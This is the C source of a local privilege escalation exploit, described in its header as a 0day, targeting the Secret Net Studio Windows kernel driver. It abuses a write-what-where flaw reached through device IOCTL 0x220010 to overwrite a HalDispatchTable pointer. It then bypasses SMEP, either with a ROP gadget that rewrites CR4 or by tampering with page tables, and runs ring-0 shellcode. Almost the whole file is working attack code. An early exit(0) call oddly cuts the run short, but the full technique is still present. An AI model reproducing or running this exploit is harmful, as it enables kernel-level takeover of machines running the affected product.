/*
Secret Net Studio local privileges escalation exploit (0day)

Discovered and developed by:
Dmytro Oleksiuk

mailto:cr4sh0@gmail.com
http://blog.cr4.sh/
*/
#include "stdafx.h"
#include <Windows.h>
#include "common.h"
#include "common_expl.h"
#include "shellcode.h"
#include "libdsebypass.h"
#include "debug.h"
#include "SNCC0_Sys_220010.h"

//
// Constants for vulnerable driver
//
#define EXPL_BUFF_SIZE      0x60
#define EXPL_CONTROL_CODE   0x220010
#define EXPL_DEVICE_PATH    SNCC0_DEVICE_PATH

static PVOID m_Rop_Mov_Cr4 = NULL;
extern KERNEL_EXPL_CONTEXT m_Context;
//--------------------------------------------------------------------------------------
NTSTATUS WINAPI _r0_proc_HalQuerySystemInformation(
	ULONG InformationClass,
	ULONG BufferSize,
	PVOID Buffer,
	PULONG ReturnedLength)
{
	_r0_proc_continue();

	return 0;
}
//--------------------------------------------------------------------------------------
#ifdef _X86_

void WINAPI GetCPUIDFeatureBits(DWORD EaxValue, PDWORD EcxValue, PDWORD EdxValue, PDWORD EbxValue)
{
	__asm
	{
		push    eax
		push    ecx
		push    edx
		push    ebx

		// get CPU information
		mov     eax, EaxValue
		mov     ecx, 0
		cpuid

		mov     eax, EcxValue
		mov[eax], ecx

		mov     eax, EdxValue
		mov[eax], edx

		mov     eax, EbxValue
		mov[eax], ebx

		pop     ebx
		pop     edx
		pop     ecx
		pop     eax
	}
}

#endif // _X86_
//--------------------------------------------------------------------------------------
DWORD RopGadgetFind(PVOID Buffer, DWORD dwSize, char *Sign, DWORD dwSignSize)
{
	for (DWORD i = 0; i < dwSize - dwSignSize; i += 1)
	{
		BOOL Matched = TRUE;
		for (DWORD n = 0; n < dwSignSize; n += 1)
		{
			if (*((PUCHAR)Buffer + i + n) != (UCHAR)Sign[n])
			{
				Matched = FALSE;
				break;
			}
		}

		if (Matched) return i;
	}

	return 0;
}

BOOL RopGadgetInit(void)
{
	BOOL bRet = FALSE;

	PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSysInf(SystemModuleInformation);
	if (Info)
	{
		// get kernel address and file name
		PVOID KernelBase = Info->Modules[0].ImageBase;
		char *lpszKernelName = (char *)Info->Modules[0].FullPathName + Info->Modules[0].OffsetToFileName;

		// load kernel image as dynamic library
		HMODULE hModule = LoadLibraryExA(lpszKernelName, 0, DONT_RESOLVE_DLL_REFERENCES);
		if (hModule)
		{
			PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
				RVATOVA(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

			PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
				RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

			// enumerate kernel image sections        
			for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
			{
				// check for usable code section
				if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
					!(pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE))
				{
					/*
					ROP gadgets search.
					*/
					PUCHAR pData = (PUCHAR)RVATOVA(hModule, pSection->VirtualAddress);
					DWORD dwDataSize = pSection->Misc.VirtualSize, dwRva = 0;

#define ROP_FIND(_var_, _sign_, _len_)                                          \
                                                                                                    \
                        if ((dwRva = RopGadgetFind(pData, dwDataSize, (_sign_), (_len_))) > 0)      \
                        {                                                                           \
                            (_var_) = RVATOVA(KernelBase, pSection->VirtualAddress + dwRva);        \
                        }

					if (m_Rop_Mov_Cr4 == NULL)
					{
#ifdef _AMD64_
						/*
						mov     cr4, rax
						add     rsp, 0x28
						ret
						*/
						ROP_FIND(m_Rop_Mov_Cr4, "\x0f\x22\xe0\x48\x83\xc4\x28\xc3", 8);
#else

#error amd64 only

#endif
					}

					if (m_Rop_Mov_Cr4)
					{
						// all gadgets was found
						break;
					}
				}

				pSection += 1;
			}

			if (m_Rop_Mov_Cr4)
			{
				DbgMsg(__FILE__, __LINE__, "MOV CR4 gadget is at " IFMT "\n", m_Rop_Mov_Cr4);

				bRet = TRUE;
			}
			else
			{
				DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find required ROP gadgets\n");
			}

			FreeLibrary(hModule);
		}
		else
		{
			DbgMsg(__FILE__, __LINE__, "LoadLibraryEx() ERROR %d\n", GetLastError());
		}

		M_FREE(Info);
	}

	return bRet;
}
//--------------------------------------------------------------------------------------
BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
{
	BOOL bBypassSMEP = FALSE;

	m_Context.bExplOk = FALSE;
	m_Context.Handler = Handler;
	m_Context.HandlerContext = HandlerContext;

	OSVERSIONINFOA Version;
	Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	// get NT verson information
	if (GetVersionExA(&Version))
	{
		if (Version.dwPlatformId == VER_PLATFORM_WIN32_NT)
		{
			if (!((Version.dwMajorVersion == 5 && Version.dwMinorVersion == 2) ||
				(Version.dwMajorVersion == 6 && Version.dwMinorVersion == 0) ||
				(Version.dwMajorVersion == 6 && Version.dwMinorVersion == 1) ||
				(Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2) ||
				(Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3) ||
				(Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0)))
			{
				DbgMsg(
					__FILE__, __LINE__, "ERROR: Unknown NT version %d.%d.%d\n",
					Version.dwMajorVersion, Version.dwMinorVersion, Version.dwBuildNumber
				);

				goto end;
			}

			DbgMsg(
				__FILE__, __LINE__, "NT version is %d.%d.%d\n",
				Version.dwMajorVersion, Version.dwMinorVersion, Version.dwBuildNumber
			);

			/*
			Determinate if we need to use ROP to bypass SMEP.
			*/
			if ((Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2) ||
				(Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3) ||
				(Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0))
			{
				bBypassSMEP = TRUE;
			}
		}
		else
		{
			DbgMsg(__FILE__, __LINE__, "ERROR: Unknown platform ID\n");
			goto end;
		}
	}
	else
	{
		DbgMsg(__FILE__, __LINE__, "GetVersionEx() ERROR %d\n", GetLastError());
		goto end;
	}

	// get real address of nt!ExAllocatePool()
	if ((m_Context.f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool")) == NULL)
	{
		DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExAllocatePool()\n");
		goto end;
	}

	// get real address of nt!HalDispatchTable
	if ((m_Context.HalDispatchTable = (PHAL_DISPATCH)KernelGetProcAddr("HalDispatchTable")) == NULL)
	{
		DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!HalDispatchTable\n");
		goto end;
	}

	DbgMsg(__FILE__, __LINE__, "nt!ExAllocatePool() is at " IFMT "\n", m_Context.f_ExAllocatePool);
	DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at " IFMT "\n", m_Context.HalDispatchTable);
	exit(0);

	LARGE_INTEGER Val;
	PVOID Trampoline = NULL;

#ifndef USE_ROP

	/*
	Use paging structures hack to bypass SMEP.

	For more information check "Windows 8 Kernel Memory Protections Bypass" article by
	MWR labs:

	https://labs.mwrinfosecurity.com/blog/windows-8-kernel-memory-protections-bypass/
	*/

	// special value that corresponds to isolated paging structures
	DWORD64 TargetAddr = 0x100804020001;
	DWORD64 TargetVal = 0x6300000000000000;

#endif // USE_ROP

	if (bBypassSMEP)
	{

#ifdef USE_ROP

		if (!RopGadgetInit())
		{
			goto end;
		}

		Val.QuadPart = (DWORD64)m_Rop_Mov_Cr4;

		/*
		Because of ROP limitation we need to allocate shellcode trampoline
		below 4GB of virtual memory space.
		*/
		DWORD_PTR Addr = PAGE_SIZE;

		while (true)
		{
			if (Trampoline = VirtualAlloc((PVOID)Addr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))
			{
				DbgMsg(__FILE__, __LINE__, "Shellcode trampoline is allocated at "IFMT"\n", Trampoline);
				break;
			}
			else if (Addr >= 0x7fff0000)
			{
				// unable to allocate memory
				goto end;
			}
			else
			{
				// try next address
				Addr += PAGE_SIZE;
			}
		}

		// PUSH RAX
		*(PUCHAR)(Trampoline) = 0x50;

		// MOV RAX, _r0_proc_continue
		*(PWORD)((DWORD_PTR)Trampoline + 1) = 0xb848;
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + 0x03) = (DWORD_PTR)&_r0_proc_continue;

		// CALL RAX ; calls _r0_proc_continue()
		*(PWORD)((DWORD_PTR)Trampoline + 0x0b) = 0xd0ff;

		// POP RAX
		*(PUCHAR)((DWORD_PTR)Trampoline + 0x0d) = 0x58;

		// ADD RSP, 20h ; restore proper stack pointer value
		*(PDWORD)((DWORD_PTR)Trampoline + 0x0e) = 0x20c48348;

		// RET ; return back to the nt!NtQueryntervalProfile()
		*(PUCHAR)((DWORD_PTR)Trampoline + 0x12) = 0xc3;

#else // USE_ROP

		PVOID Shellcode = &_r0_proc_begin;
		DWORD dwShellcodeSize = (DWORD)((DWORD_PTR)&_r0_proc_end - (DWORD_PTR)&_r0_proc_begin);

		DbgMsg(__FILE__, __LINE__, "Shellcode size is 0x%x bytes\n", dwShellcodeSize);

		// check if our ring0 code fits into the single page
		if (dwShellcodeSize > PAGE_SIZE - 0x100)
		{
			DbgMsg(__FILE__, __LINE__, "ERROR: Shellcode is too large\n");
			goto end;
		}

		// allocate shellcode trampoline
		if ((Trampoline = VirtualAlloc((PVOID)TargetAddr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
		{
			DbgMsg(__FILE__, __LINE__, "VirtualAlloc() ERROR %d\n", GetLastError());
			goto end;
		}

		DbgMsg(__FILE__, __LINE__, "Shellcode is allocated at " IFMT "\n", Trampoline);

		DWORD Ptr = 0, PtrAddr = 0;

		// MOV RCX, pContext
		*(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb948;
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = (DWORD_PTR)&m_Context;
		Ptr += 10;

		// MOV RDX, ShellcodeAddr
		*(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xba48;
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = (DWORD_PTR)Trampoline;
		Ptr += 10;

		// MOV RAX, _r0_proc_begin
		*(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb848;
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0;

		// remember offset of _r0_proc_begin() address
		PtrAddr = Ptr;
		Ptr += 10;

		// SUB RSP, 28h ; restore proper stack pointer value
		*(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x28ec8348;
		Ptr += 4;

		// CALL RAX ; calls _r0_proc_begin()
		*(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xd0ff;
		Ptr += 2;

		// ADD RSP, 28h ; restore proper stack pointer value
		*(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x28c48348;
		Ptr += 4;

		// MOV RAX, 0xC00000001
		*(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb848;
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0xc00000001;
		Ptr += 10;

		// RET ; return back to the nt!NtQueryntervalProfile()
		*(PUCHAR)((DWORD_PTR)Trampoline + Ptr) = 0xc3;
		Ptr += 1;

		// set _r0_proc_begin() address
		*(PDWORD_PTR)((DWORD_PTR)Trampoline + PtrAddr + sizeof(WORD)) = (DWORD_PTR)Trampoline + Ptr;

		memcpy(RVATOVA(Trampoline, Ptr), Shellcode, dwShellcodeSize);

		if (m_Context.Handler)
		{
			// switch handler to the copied code
			m_Context.Handler = (KERNEL_EXPL_HANDLER)((DWORD_PTR)m_Context.Handler - (DWORD_PTR)&_r0_proc_begin + Ptr);
		}

#endif // USE_ROP

	}
	else
	{
		Val.QuadPart = (DWORD64)&_r0_proc_HalQuerySystemInformation;
	}

	DbgMsg(__FILE__, __LINE__, "Opengin device \"%s\"...\n", EXPL_DEVICE_PATH);

	// get handle to the target device
	HANDLE hDev = CreateFile(_T(EXPL_DEVICE_PATH), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDev == INVALID_HANDLE_VALUE)
	{
		DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
		goto end;
	}

	DWORD ns = 0;
	OBJECT_ATTRIBUTES ObjAttr;
	IO_STATUS_BLOCK StatusBlock;
	UCHAR Buff[EXPL_BUFF_SIZE];

	ZeroMemory(&ObjAttr, sizeof(ObjAttr));
	ZeroMemory(&StatusBlock, sizeof(StatusBlock));
	ZeroMemory(Buff, sizeof(Buff));

	DbgMsg(__FILE__, __LINE__, "IRP user buffer address is " IFMT "\n", &Buff);

	GET_NATIVE(NtDeviceIoControlFile);
	GET_NATIVE(NtQueryIntervalProfile);
	GET_NATIVE(NtQuerySystemInformation);

#define SEND_IOCTL(_code_, _ib_, _il_, _ob_, _ol_)          \
                                                                \
        ns = f_NtDeviceIoControlFile(                           \
            hDev, NULL, NULL, NULL, &StatusBlock, (_code_),     \
            (PVOID)(_ib_), (DWORD)(_il_),                       \
            (PVOID)(_ob_), (DWORD)(_ol_)                        \
        );                                                      \
                                                                \
        DbgMsg(                                                 \
            __FILE__, __LINE__,                                 \
            "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n",   \
            (_code_), ns, StatusBlock.Information               \
        );

#ifdef _AMD64_

	/*
	We need to fill IOCTL input buffer with values that will be processed
	by vulnerable IOCTL handler in following way:

	where = *(_QWORD *)Buff
	what = *(_DWORD *)(Buff + 0x58)
	trash = *(_DWORD *)(Buff + 0x5C)
	a4 = (const void *)(Buff + 0x60)

	...

	*(_DWORD *)(where + 0x18) = what;
	**(_DWORD **)(where + 0x10) = trash;
	if (!what && trash <= *(_DWORD *)where)
	qmemcpy(*(void **)(where + 8), a4, trash);
	KeSetEvent((PRKEVENT)(where + 32), 0, 0);

	...
	*/
	*(PDWORD)&Buff[0x5c] = 0;

#define OVERWITE_DWORD(_addr_, _val_)                                                           \
                                                                                                    \
        *(PDWORD)&Buff[0x58] = (_val_);                                                             \
        *(PDWORD64)&Buff[0x00] = (DWORD64)((PUCHAR)(_addr_) - 0x18);                                \
                                                                                                    \
        /* overwrite single dword */                                                                \
        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));      \

#define OVERWITE_DWORD_PTR(_addr_, _val_)                                                       \
                                                                                                    \
        Val.QuadPart = (DWORD64)(_val_);                                                            \
                                                                                                    \
        /* overwrite lower dword */                                                                 \
        OVERWITE_DWORD((DWORD_PTR)(_addr_), Val.LowPart);                                           \
                                                                                                    \
        /* overwrite higher dword */                                                                \
        OVERWITE_DWORD((DWORD_PTR)(_addr_) + sizeof(DWORD), Val.HighPart);    

#ifndef USE_ROP    

	if (bBypassSMEP)
	{
		// determinate virtual addresses of necassary paging structures
		DWORD64 PT = VA_to_PT(TargetAddr);
		DWORD64 PD = VA_to_PD(TargetAddr);
		DWORD64 PDPT = VA_to_PDPT(TargetAddr);
		DWORD64 PML4 = VA_to_PML4(TargetAddr);

		// overwrite paging structures and make shellcode trampoline executable from kernel mode
		OVERWITE_DWORD_PTR(PT - 7, TargetVal);
		OVERWITE_DWORD_PTR(PD - 7, TargetVal);
		OVERWITE_DWORD_PTR(PDPT - 7, TargetVal);
		OVERWITE_DWORD_PTR(PML4 - 7, TargetVal);

		// overwrite HAL_DISPATCH_TABLE function pointer with shellcode trampoline address
		OVERWITE_DWORD_PTR(&m_Context.HalDispatchTable->HalQuerySystemInformation, Trampoline);
	}
	else

#endif // USE_ROP

	{
		OVERWITE_DWORD_PTR(&m_Context.HalDispatchTable->HalQuerySystemInformation, Val.QuadPart);
	}

#else

#error amd64 only

#endif    

	// run current thread only on first CPU
	SetThreadAffinityMask(GetCurrentThread(), 1);

#ifdef USE_ROP

	if (bBypassSMEP)
	{
		/*
		Use ROP for SMEP bypass.
		*/
		DWORD FeaturesEcx = 0, FeaturesEdx = 0, FeaturesEbx = 0;
		DWORD ExtFeaturesEcx = 0, ExtFeaturesEdx = 0, ExtFeaturesEbx = 0;

		// get features bits and extended features bits
		GetCPUIDFeatureBits(0x00000001, &FeaturesEcx, &FeaturesEdx, &FeaturesEbx);
		GetCPUIDFeatureBits(0x00000007, &ExtFeaturesEcx, &ExtFeaturesEdx, &ExtFeaturesEbx);

		DbgMsg(
			__FILE__, __LINE__, "CPUID: EAX = 0x00000001, EDX = 0x%.8x, ECX = 0x%.8x\n",
			FeaturesEdx, FeaturesEcx
		);

		DbgMsg(
			__FILE__, __LINE__, "CPUID: EAX = 0x00000007, EBX = 0x%.8x, ECX = 0x%.8x\n",
			ExtFeaturesEbx, ExtFeaturesEcx
		);

		DWORD InfoSize = 0;
		SYSTEM_PROCESSOR_INFORMATION ProcessorInfo;
		ProcessorInfo.ProcessorFeatureBits = 0;

		ns = f_NtQuerySystemInformation(
			SystemProcessorInformation, &ProcessorInfo, sizeof(ProcessorInfo), &InfoSize
		);
		if (NT_SUCCESS(ns))
		{
			DbgMsg(
				__FILE__, __LINE__, "ProcessorFeatureBits is 0x%.8x\n",
				ProcessorInfo.ProcessorFeatureBits
			);
		}

		/*
		Calculate actual CR4 register value for current machine using hardware information.

		CR4 register bits explanation:

		21 SMAP - Supervisor Mode Access Protection Enable
		If set, access of data in a higher ring generates a fault[1]

		20 SMEP - Supervisor Mode Execution Protection Enable
		If set, execution of code in a higher ring generates a fault

		18 OSXSAVE - XSAVE and Processor Extended States Enable

		17 PCIDE - PCID Enable
		If set, enables process-context identifiers (PCIDs).

		14 SMXE - Safer Mode Extensions Enable, see Trusted Execution Technology (TXT)
		13 VMXE - Virtual Machine Extensions Enable, see Intel VT-x

		10 OSXMMEXCPT - Operating System Support for Unmasked SIMD Floating-Point Exceptions
		If set, enables unmasked SSE exceptions.

		x 9 OSFXSR - Operating system    support for FXSAVE and FXRSTOR instructions
		If set, enables SSE instructions and fast FPU save & restore.

		8 PCE - Performance-Monitoring Counter enable
		If set, RDPMC can be executed at any privilege level, else RDPMC can only be used in ring 0.

		7 PGE - Page Global Enabled
		If set, address translations (PDE or PTE records) may be shared between address spaces.

		6 MCE - Machine Check Exception
		If set, enables machine check interrupts to occur.

		5 PAE - Physical Address Extension
		If set, changes page table layout to translate 32-bit virtual addresses into extended 36-bit physical addresses.

		4 PSE - Page Size Extension
		If unset, page size is 4 KiB, else page size is increased to 4 MiB (or 2 MiB with PAE set).

		3 DE - Debugging Extensions
		If set, enables debug register based breaks on I/O space access.

		2 TSD - Time Stamp Disable
		If set, RDTSC instruction can only be executed when in ring 0, otherwise RDTSC can be used at any privilege level.

		1 PVI - Protected-mode Virtual Interrupts
		If set, enables support for the virtual interrupt flag (VIF) in protected mode.

		0 VME - Virtual 8086 Mode Extensions
		If set, enables support for the virtual interrupt flag (VIF) in virtual-8086 mode.
		*/
		DWORD Cr4Value = CR4_VME | CR4_DE | CR4_PAE | CR4_MCE | CR4_FXSR | CR4_XMMEXCPT;

		if (FeaturesEcx & CPUID_OSXSAVE)
		{
			// XSAVE and processor extended states - enable bit
			Cr4Value |= CR4_OSXSAVE;
		}

		if (FeaturesEcx & CPUID_VMX)
		{
			// Virtual Machine eXtensions are supported
			Cr4Value |= CR4_VMXE;
		}

		if (ExtFeaturesEbx & CPUID_FSGSBASE)
		{
			// RDFSBASE/RDGSBASE/etc. instructions are supported
			Cr4Value |= CR4_FSGSBASE;
		}

		if (ProcessorInfo.ProcessorFeatureBits & KF_LARGE_PAGE)
		{
			// Page Size Extensions are supported
			Cr4Value |= CR4_PSE;
		}

		if (ProcessorInfo.ProcessorFeatureBits & KF_GLOBAL_PAGE)
		{
			// Page Global Enabled
			Cr4Value |= CR4_PGE;
		}

		DbgMsg(__FILE__, __LINE__, "New CR4 value is 0x%.8x\n", Cr4Value);

		/*
		NtQueryIntervalProfile() calls nt!KeQueryIntervalProfile(),
		that calls our overwritten HalQuerySystemInformation pointer.
		*/
		DWORD_PTR Source = (DWORD_PTR)Trampoline;
		f_NtQueryIntervalProfile(Source, &Cr4Value);
	}
	else

#endif // USE_ROP

	{
		DWORD Interval = 0;

		/*
		Don't use ROP, call shellcode directly.
		*/
		f_NtQueryIntervalProfile(ProfileTotalIssues, &Interval);
	}

end:

	if (Trampoline)
	{
		VirtualFree(Trampoline, 0, MEM_RELEASE);
	}

	if (hDev)
	{
		CloseHandle(hDev);
	}

	if (m_Context.bExplOk)
	{
		DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation success\n");
	}
	else
	{
		DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Exploitation fails\n");
	}

	return m_Context.bExplOk;
}
//--------------------------------------------------------------------------------------
// EoF